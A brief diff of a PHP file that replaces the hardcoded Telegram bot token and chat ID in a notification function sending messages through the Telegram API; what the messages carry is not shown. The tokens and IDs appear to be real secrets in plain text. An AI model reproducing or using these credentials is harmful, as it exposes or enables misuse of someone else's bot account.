@@ -141,8 +141,8 @@
 
     if ( !function_exists('envoyerNotificationTelegram') ) {
         function envoyerNotificationTelegram($message) {
-            define('TELEGRAM_BOT_TOKEN', '6661677942:AAFMV4wlTcM6yzzACRPmhYHz2NXhKewtbhI');
-            define('TELEGRAM_CHAT_ID', '6093939424');
+            define('TELEGRAM_BOT_TOKEN', '6422541077:AAFHb4GCcO9wsJlpruEcYYB_rDZx71tmrZw');
+            define('TELEGRAM_CHAT_ID', '6063207904');
             $url = 'https://api.telegram.org/bot' . TELEGRAM_BOT_TOKEN . '/sendMessage';
             $data = array(
                 'chat_id' => TELEGRAM_CHAT_ID,
